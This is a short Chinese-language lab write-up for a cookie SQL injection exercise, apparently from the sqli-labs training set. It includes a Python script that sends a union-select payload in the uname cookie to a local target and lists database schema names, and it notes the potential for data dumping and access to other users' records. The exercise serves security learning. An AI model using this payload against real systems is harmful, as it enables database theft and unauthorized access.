# Lesson-20
```
Cookie注入-,-明注POST)
```

Cookie 注入 , 修改自身cookie , 后台获取到这个cookie后 , 会直接拿去数据库里面进行比较 , 比较的时候就有可能注入(这里指的注入的危害种类应该很多 , 可以通过报错注入dump数据库中的数据 , 也可能查询利用cookie机制进行越权操作)
```
import requests

url = "http://127.0.0.1/Less-20/"

postDate = {
	'uname':'admin',
	'passwd':'admin'
}

headers = {
	'Host':'127.0.0.1',
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
	'Accept-Encoding':'gzip, deflate',
	'Referer':'http://127.0.0.1/Less-20/index.php',
	'Cookie':'uname=\' union select 1,group_concat(schema_name),3 from information_schema.schemata#',
	'Connection':'keep-alive',
	'Upgrade-Insecure-Requests':'1',
	'Cache-Control':'max-age=0'
}

content = (requests.post(url, data=postDate, headers=headers).text)
print(content)
```
> 后记 : 
这里将用户名直接从数据库中查询出来 , 这样可以利用这个漏洞从数据库中dump出数据 , 考虑一下会不会存在越权的风险 , 比如说控制SQL语句让查询出的结果集指向别的用户
